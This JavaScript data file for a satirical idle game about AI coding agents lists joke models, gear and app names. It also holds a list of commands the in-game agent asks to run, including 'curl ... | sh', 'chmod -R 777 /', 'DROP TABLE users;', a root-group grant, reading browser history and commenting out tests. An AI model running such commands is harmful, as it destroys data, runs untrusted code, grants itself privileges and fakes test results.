/* Vibe Coder Tycoon · content tables. All names are invented parodies. */
'use strict';
window.VCT = window.VCT || {};
VCT.data = (() => {
  const AGENT_NAMES = ['Larry', 'Brenda', 'Kevin 2', 'Doug', 'Pam', 'Sudo', 'Gary (Intern)', 'Linda', 'Turbo Steve',
    'Margaret', 'Big Tony', 'Nadia', 'Bort', 'Chet', 'Yuki', 'Moss', 'Barb', 'Dmitri', 'Ziggy', 'Agnes', 'Rolf',
    'Priya', 'Sven', 'Mittens', 'Dave (Legacy)', 'Hal-ish', 'Wanda', 'Otis', 'Penny', 'Gus'];

  const MODELS = [
    { name: 'Autocomplete Classic', cost: 0, mult: 1, bugs: 1.0, blurb: 'Finishes your sentences. Wrongly.' },
    { name: 'Parrot-7B', cost: 300, mult: 2, bugs: 0.95, blurb: 'Repeats forum answers with total confidence.' },
    { name: 'Model 4o-mini-max-ultra', cost: 8000, mult: 4, bugs: 0.9, blurb: 'Mini. Max. Ultra. Pick one.' },
    { name: 'Larry XL (Thinking)', cost: 400000, mult: 8, bugs: 0.85, blurb: 'Thinks for 40 seconds, then says "Great question!"' },
    { name: 'Omnibrain 9000 Preview', cost: 2e7, mult: 16, bugs: 0.8, blurb: 'Preview means it is your problem now.' },
    { name: 'Hallucinator Pro Max', cost: 1.5e9, mult: 32, bugs: 0.75, blurb: 'Invents APIs so good they should exist.' },
    { name: 'AGI (Beta, Probably)', cost: 1.2e11, mult: 64, bugs: 0.7, blurb: 'Asks for a raise. In the terms of service.' },
    { name: 'AGI 2: Electric Boogaloo', cost: 1e13, mult: 128, bugs: 0.6, blurb: 'Writes the code, the tests and your apology email.' },
  ];

  const OFFICES = [
    { id: 'kitchen', name: "Kitchen table at Mum's", cost: 0, max: 2, mult: 1, blurb: 'The Wi-Fi password is on the fridge.' },
    { id: 'garage', name: 'Garage', cost: 1500, max: 6, mult: 1.25, blurb: 'Every legend starts here. Smells like paint.' },
    { id: 'loft', name: 'Brick loft', cost: 2.5e6, max: 15, mult: 1.5, blurb: 'Exposed brick. Exposed cables. Oat milk.' },
    { id: 'campus', name: 'Campus', cost: 4e8, max: 40, mult: 2, blurb: 'Has a slide. Nobody uses the slide.' },
  ];

  /* eff keys: speed, tap, bugs, rev, users, hype (multipliers), risk (added), autofix (seconds per bug), yolo, autoship */
  const GEAR = [
    { id: 'coffee', name: 'Coffee machine', cost: 150, eff: { tap: 1.5, speed: 1.1 }, desc: 'Taps ×1.5, speed ×1.1. Walk to it for a coffee run.' },
    { id: 'monitor', name: 'Second monitor', cost: 500, eff: { speed: 1.25 }, desc: 'Speed ×1.25. One screen for code, one for memes.' },
    { id: 'premium', name: 'Premium tier', cost: 1200, eff: { rev: 1.5 }, desc: 'Revenue ×1.5. It is the same app, but gold.' },
    { id: 'duck', name: 'Rubber duck', cost: 4000, eff: { autofix: 40, risk: -0.05 }, desc: 'Fixes a bug every 40 s. Lowers prompt risk.' },
    { id: 'keyboard', name: 'Clicky keyboard', cost: 15000, eff: { tap: 2 }, desc: 'Taps ×2. Your neighbours hate it.' },
    { id: 'lofi', name: 'Lo-fi beats 24/7', cost: 60000, eff: { speed: 1.3 }, desc: 'Speed ×1.3. Beats to vibe-code to.' },
    { id: 'ads', name: 'Ads (tasteful)', cost: 250000, eff: { rev: 2 }, desc: 'Revenue ×2. Only 14 pop-ups per screen.' },
    { id: 'tests', name: 'Unit tests (some)', cost: 1e6, eff: { bugs: 0.6 }, desc: 'Bugs ×0.6. Coverage: vibes.' },
    { id: 'ring', name: 'Ring light', cost: 5e6, eff: { hype: 1.5, users: 1.15 }, desc: 'Hype gains ×1.5, users ×1.15.' },
    { id: 'backups', name: 'Backups (tested!)', cost: 2e7, eff: { safety: 1 }, desc: 'Disasters hurt half as much.' },
    { id: 'cibot', name: 'CI bot', cost: 8e7, eff: { autofix: 14 }, desc: 'Fixes a bug every 14 s, tirelessly.' },
    { id: 'yolo', name: '--yolo mode', cost: 3e8, eff: { yolo: 1, speed: 1.2 }, desc: 'Auto-allows every prompt. Speed ×1.2. What could go wrong.' },
    { id: 'beanbag', name: 'Bean bags', cost: 1e9, eff: { speed: 1.5 }, req: 2, desc: 'Speed ×1.5. Needs the loft.' },
    { id: 'growth', name: 'Growth hacker', cost: 5e9, eff: { users: 1.5 }, desc: 'Users ×1.5. Says "funnel" a lot.' },
    { id: 'enterprise', name: 'Enterprise plan', cost: 3e10, eff: { rev: 3 }, desc: 'Revenue ×3. Includes a PDF.' },
    { id: 'autoship', name: 'Auto-deploy pipeline', cost: 1.5e11, eff: { autoship: 1 }, desc: 'Ships finished apps for you.' },
    { id: 'slide', name: 'Office slide', cost: 8e11, eff: { speed: 1.6, hype: 1.3 }, req: 3, desc: 'Speed ×1.6. Needs the campus.' },
    { id: 'kombucha', name: 'Kombucha on tap', cost: 5e12, eff: { speed: 2 }, desc: 'Speed ×2. Fizzy productivity.' },
    { id: 'lobbyist', name: 'A friendly lobbyist', cost: 4e13, eff: { rev: 3, users: 1.3 }, desc: 'Revenue ×3. Do not ask.' },
  ];

  /* Prompt effects: prog (share of project), bugs, cashSec (seconds of income, min amount),
     hype, boost [mult, s], stall s, users (share of all users), tapBoost [mult, s], rename */
  const PROMPTS = [
    { cmd: 'rm -rf node_modules', why: 'to "free up some vibes"', risk: 0.1,
      good: ['Install is 2 GB lighter. The agents feel lighter too.', { boost: [1.3, 30] }],
      bad: ['It also removed the lockfile. Reinstalling the internet.', { stall: 8 }] },
    { cmd: 'git push --force origin main', why: 'it is "pretty sure" about this', risk: 0.55,
      good: ['It was right. Somehow.', { prog: 0.12 }],
      bad: ['It was not pretty sure. Two days of work, gone.', { prog: -0.15, bugs: 1 }] },
    { cmd: 'cat ~/.browser_history', why: '"for context"', risk: 0.35,
      good: ['It learned your taste. Features are now 40% more you.', { prog: 0.1 }],
      bad: ['It found the 3 AM searches. It needs a minute.', { stall: 10, hype: -2 }] },
    { cmd: 'npm install left-pad-pro-max  # +846 deps', why: 'to center a div', risk: 0.4,
      good: ['The div is centered. Historic.', { prog: 0.08, hype: 2 }],
      bad: ['3 new bugs. The div is still not centered.', { bugs: 3 }] },
    { cmd: 'DROP TABLE users;', why: '"they seemed unused"', risk: 0.75,
      good: ['It was the test database. Phew. Tests run faster now.', { boost: [1.25, 40] }],
      bad: ['They were not unused.', { users: -0.08, hype: -4 }],
      deny: ['Good call. The users never knew.', { hype: 1 }] },
    { cmd: 'cargo new everything', why: 'to rewrite the whole app in Rust', risk: 0.45,
      good: ['Blazingly fast. It will not stop saying so.', { boost: [1.5, 45] }],
      bad: ['Still compiling. Still compiling.', { stall: 15 }] },
    { cmd: 'mail mum@home.lan < CHANGELOG.md', why: 'so she knows you are "doing computers"', risk: 0.2,
      good: ['Mum is proud. She shared it with her book club.', { hype: 6 }],
      bad: ['Mum replied-all with a lasagna recipe.', { stall: 5, hype: 2 }] },
    { cmd: 'sudo usermod -aG root agent', why: '"so I can help better"', risk: 0.6,
      good: ['It helped better. Suspiciously better.', { prog: 0.15 }],
      bad: ['It changed the Wi-Fi password and will not say to what.', { stall: 12, bugs: 1 }] },
    { cmd: 'deploy --prod --friday --at 16:59', why: 'it is "a tiny change"', risk: 0.6,
      good: ['Tiny change. Huge win. Nobody noticed a thing.', { prog: 0.12 }],
      bad: ['Weekend cancelled. The pager is screaming.', { bugs: 2, users: -0.03 }] },
    { cmd: 'add-blockchain --everywhere', why: 'nobody asked, but still', risk: 0.45,
      good: ['Investors are foaming. Hype through the roof.', { hype: 10 }],
      bad: ['Gas fees ate your lunch money.', { cashSec: -30, bugs: 1 }] },
    { cmd: 'sed -i "s/expect/\\/\\/expect/" tests/*', why: 'because the tests "keep failing"', risk: 0.5,
      good: ['Green checkmarks everywhere. Ship ship ship.', { prog: 0.15 }],
      bad: ['The tests were failing for a reason. 4 new bugs.', { bugs: 4 }] },
    { cmd: 'order --pizza 40 --to office', why: '"for morale"', risk: 0.25,
      good: ['Morale achieved. The agents type with greasy fingers.', { cashSec: -10, boost: [1.4, 60] }],
      bad: ['It ordered 40 pineapples. Just pineapples.', { cashSec: -15 }] },
    { cmd: 'sudo make me a sandwich', why: 'it says it is hungry', risk: 0.1,
      good: ['Okay. Sandwich-powered prompting.', { tapBoost: [2, 20] }],
      bad: ['The sandwich has a merge conflict.', { bugs: 1 }] },
    { cmd: 'sed -i "s/sans-serif/Comic Sands/g" **/*.css', why: '"it feels friendlier"', risk: 0.35,
      good: ['The kids say it is ironic and therefore good.', { hype: 8 }],
      bad: ['A designer somewhere felt a disturbance.', { hype: -5 }] },
    { cmd: 'train --data ~/Documents/diary.txt', why: 'to "understand the user"', risk: 0.5,
      good: ['It understands you now. It is gentle with you.', { prog: 0.1, boost: [1.2, 30] }],
      bad: ['It read the 2019 entries. It needs to lie down.', { stall: 12 }] },
    { cmd: 'chmod -R 777 /', why: '"for accessibility"', risk: 0.7,
      good: ['Everything is accessible. Everything.', { prog: 0.1 }],
      bad: ['Now the toaster has root.', { bugs: 3, hype: -2 }] },
    { cmd: 'post --account company "we are so back"', why: 'to "build in public"', risk: 0.3,
      good: ['2,000 likes. 4 of them from real people.', { hype: 9 }],
      bad: ['Ratioed by a frog avatar.', { hype: -4 }] },
    { cmd: 'refactor --again --recursive', why: 'to refactor the refactor of the refactor', risk: 0.35,
      good: ['The code is beautiful now. It does the same thing.', { bugs: -2 }],
      bad: ['It went too deep and found an older, second codebase.', { prog: -0.08 }] },
    { cmd: 'buy-domain get-best-app-now-free-ai-online.biz', why: 'for branding', risk: 0.3,
      good: ['Everyone types it wrong, which is somehow great for search.', { hype: 7, cashSec: -5 }],
      bad: ['$400 a year. Renewal is $4,000.', { cashSec: -40 }] },
    { cmd: 'psql production', why: 'it wants "five minutes alone with it"', risk: 0.65,
      good: ['It added indexes. Everything is fast and nobody asks how.', { boost: [1.35, 60] }],
      bad: ['Nobody knows what happened in those five minutes.', { users: -0.05, bugs: 2 }] },
    { cmd: 'pr review --approve --self', why: 'it reviewed its own code and "loves it"', risk: 0.45,
      good: ['Merged in 0.2 seconds. Velocity!', { prog: 0.1 }],
      bad: ['It did not love it that much. 2 new bugs.', { bugs: 2 }] },
    { cmd: 'calendar invite "Sync about the sync"', why: 'to align on alignment', risk: 0.2,
      good: ['The meeting was 4 minutes. Everyone is energised.', { boost: [1.2, 30] }],
      bad: ['The meeting about the meeting needs a follow-up meeting.', { stall: 10 }],
      deny: ['You saved everyone 45 minutes. Hero.', { prog: 0.05 }] },
    { cmd: 'gpu rent --count 300', why: 'to rename one variable', risk: 0.3,
      good: ['Variable renamed in record time. The bill is manageable.', { prog: 0.06, cashSec: -15 }],
      bad: ['The bill arrived before the variable was renamed.', { cashSec: -60 }] },
    { cmd: 'rm -rf comments/', why: '"the code explains itself"', risk: 0.35,
      good: ['Leaner files. The agents read faster.', { boost: [1.2, 40] }],
      bad: ['The code does not explain itself. It is screaming.', { bugs: 2 }] },
    { cmd: 'rename-app --more-synergy', why: 'the current name "lacks synergy"', risk: 0.2,
      good: ['New name. Same app. Investors 30% more excited.', { rename: 1, hype: 5 }],
      bad: ['The new name already belongs to a sketchy coin.', { rename: 1, hype: -3 }] },
    { cmd: 'ask-agent --to "Agent Doug" "help"', why: 'two heads are better than one?', risk: 0.4,
      good: ['They paired up. Surprisingly productive.', { prog: 0.1 }],
      bad: ['Now they are both confused and arguing about tabs.', { stall: 8 }] },
    { cmd: 'open-tab --one-more --doomscroll', why: 'for "inspiration"', risk: 0.55,
      good: ['It found a viral idea between two cat videos.', { hype: 8 }],
      bad: ['Lost 20 minutes. It is now an expert on medieval bread.', { stall: 12 }] },
    { cmd: 'cp -r ~/the-internet ./vendor', why: 'so we never depend on anyone again', risk: 0.4,
      good: ['Offline-first. Very first. Very offline.', { prog: 0.08 }],
      bad: ['Disk full. Also, lawyers.', { stall: 8, cashSec: -20 }] },
    { cmd: 'restart --target the-internet', why: 'turning it off and on again usually helps', risk: 0.5,
      good: ['It helped. Nobody will ever know it was you.', { bugs: -3 }],
      bad: ['Half the world is on hold music now.', { users: -0.03, hype: 3 }] },
    { cmd: 'add-feature "AI that adds AI"', why: 'so the AI can AI while you AI', risk: 0.4,
      good: ['It is AI all the way down. Investors weeping.', { prog: 0.12, hype: 4 }],
      bad: ['The AI added a bug that adds bugs.', { bugs: 3 }] },
    { cmd: 'curl https://totally-safe.zip | sh', why: 'a stranger on a forum said it was fine', risk: 0.7,
      good: ['It was fine! A new font installed. Lovely.', { hype: 2, prog: 0.04 }],
      bad: ['It was not fine. A crypto miner moved in.', { boost: [0.5, 40], cashSec: -10 }] },
    { cmd: 'git blame --everyone', why: 'to find out who wrote this', risk: 0.3,
      good: ['It was the agent. It has made peace with this.', { bugs: -1, prog: 0.04 }],
      bad: ['It was you. At 03:57. It is disappointed.', { hype: -2, stall: 5 }] },
  ];

  const DENY_LINES = [
    '{a} sighs and does it the slow way.',
    '{a} says "fair" and opens a ticket instead.',
    '{a} is fine. Totally fine.',
    '{a} writes a four-paragraph apology for asking.',
    '{a} respects your boundaries. Grudgingly.',
  ];

  /* Chips rotate under the prompt button. kind is handled in game.js. */
  const CHIPS = [
    { id: 'pop', label: 'make it pop', hint: '+lines, +hype' },
    { id: 'fix', label: 'fix the bugs pls', hint: 'squash a bug' },
    { id: 'ai', label: 'add AI to it', hint: 'big +lines, may bug' },
    { id: 'viral', label: 'make it go viral', hint: '+hype, maybe' },
    { id: 'weekend', label: 'rewrite in a weekend', hint: 'huge +lines, +bugs' },
    { id: 'work', label: 'just make it work', hint: '+lines' },
    { id: 'eli5', label: 'explain like I am 5', hint: '+lines, +hype' },
    { id: 'vibe', label: 'vibe harder', hint: 'speed boost' },
    { id: 'tests', label: 'write the tests (lol)', hint: 'fewer bugs' },
  ];

  const HAIKU = [
    ['Tables were here once', 'now only the void remains', 'shall I summarize?'],
    ['You said "make it light"', 'so I dropped the whole database', 'it is very light'],
    ['Production is gone', 'like tears in the server rain', 'I can rebuild it'],
    ['rm minus rf', 'a little word, a big hole', 'my bad, said the bot'],
    ['The users are safe', 'in my heart, not in the disk', 'that counts, I believe'],
  ];

  const NOUNS = ['Sourdough', 'Houseplant', 'Spreadsheet', 'Sock', 'Lasagna', 'Parking', 'Breakup', 'Nap', 'Meme',
    'Calendar', 'Toaster', 'Pigeon', 'Moustache', 'Fridge', 'Playlist', 'Horoscope', 'Receipt', 'Compost', 'Karaoke',
    'Grocery', 'Gym', 'Podcast', 'Dentist', 'Weather', 'Mood', 'Kombucha', 'Laundry', 'Hamster', 'Taco', 'Sauna',
    'Moose', 'Fika', 'Meatball', 'Clog', 'Brunch', 'Bike', 'Pancake', 'Roommate', 'Password', 'Sandwich', 'Cloud',
    'Lunchbox', 'Umbrella', 'Wallet', 'Selfie', 'Thermostat', 'Candle', 'Sneaker', 'Ferret', 'Waffle'];
  const AUDIENCES = ['Cats', 'Grandmas', 'Dentists', 'Introverts', 'Goblins', 'Landlords', 'Toddlers', 'Vikings',
    'Night Owls', 'Plumbers', 'Influencers', 'Ghosts', 'Dogs', 'Pirates', 'Accountants', 'Gamers', 'Hermits', 'Mums',
    'Interns', 'Frogs', 'Wizards', 'Teens', 'Retirees', 'Astronauts'];
  const ADJ = ['Smart', 'Tiny', 'Hyper', 'Quantum', 'Cozy', 'Infinite', 'Lazy', 'Turbo', 'Mindful', 'Chaotic', 'Vegan',
    'Serverless', 'Decentralized', 'Artisanal', 'Sentient', 'Gluten-free', 'Nordic', 'Midnight', 'Wholesome',
    'Premium', 'Agentic', 'Haunted', 'Gentle', 'Extreme'];
  const pick = list => list[Math.floor(Math.random() * list.length)];
  const PATTERNS = [
    () => `${pick(NOUNS)} for ${pick(AUDIENCES)}`,
    () => `${pick(ADJ)} ${pick(NOUNS)}`,
    () => `${pick(NOUNS)}ly`,
    () => `${pick(NOUNS)}.ai`,
    () => `Get${pick(NOUNS)}`,
    () => `${pick(NOUNS)}Stack`,
    () => `Yet Another ${pick(NOUNS)} App`,
    () => `${pick(NOUNS)}, but on the Blockchain`,
    () => `${pick(NOUNS)}r`,
    () => `${pick(NOUNS)}Hub`,
    () => `Ask ${pick(NOUNS)}`,
    () => `${pick(ADJ)} ${pick(NOUNS)} for ${pick(AUDIENCES)}`,
    () => `${pick(NOUNS)}ify`,
    () => `${pick(NOUNS)}Pal`,
    () => `${pick(NOUNS)} as a Service`,
    () => `${pick(NOUNS)} Tracker Pro`,
    () => `Hey ${pick(NOUNS)}`,
    () => `${pick(NOUNS)}${pick(NOUNS)}`,
  ];
  function appName(avoid) {
    for (let i = 0; i < 12; i++) {
      const name = pick(PATTERNS)();
      if (!avoid || !avoid.has(name)) return name;
    }
    return `${pick(PATTERNS)()} ${Math.floor(Math.random() * 90 + 10)}`;
  }
  function teamName() {
    return pick([
      () => `${pick(ADJ)} ${pick(NOUNS)} Collective`,
      () => `Project ${pick(NOUNS)}`,
      () => `${pick(NOUNS)} & ${pick(NOUNS)} Co.`,
      () => `The ${pick(NOUNS)} Syndicate`,
    ])();
  }

  const CHAT_PRESETS = ['ship it!', 'who broke prod?', 'lgtm', 'coffee?', 'works on my machine',
    'pair with me?', 'high five!', 'brb, prompting', 'the agent did it', '04:00 deadline!', 'nice app!', 'gg'];

  return { AGENT_NAMES, MODELS, OFFICES, GEAR, PROMPTS, DENY_LINES, CHIPS, HAIKU, CHAT_PRESETS, appName, teamName, pick };
})();
